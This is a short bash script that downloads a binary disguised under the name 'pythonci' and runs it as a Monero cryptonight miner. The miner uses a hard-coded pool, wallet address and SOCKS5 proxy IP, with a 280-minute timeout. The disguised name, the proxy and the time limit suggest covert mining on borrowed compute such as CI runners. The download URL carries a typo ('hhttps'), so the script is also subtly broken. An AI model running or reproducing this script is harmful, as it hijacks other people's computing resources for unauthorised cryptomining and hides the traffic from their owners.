#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget hhttps://github.com/NRC-TECH/test-files/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://monerohash.com:2222 
WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1FBABdbXtwbWCgk8DkStvmj 
PROXY=socks5://72.195.114.169:4145
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
timeout 280m ./pythonci -a cryptonight -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY
echo Sukses
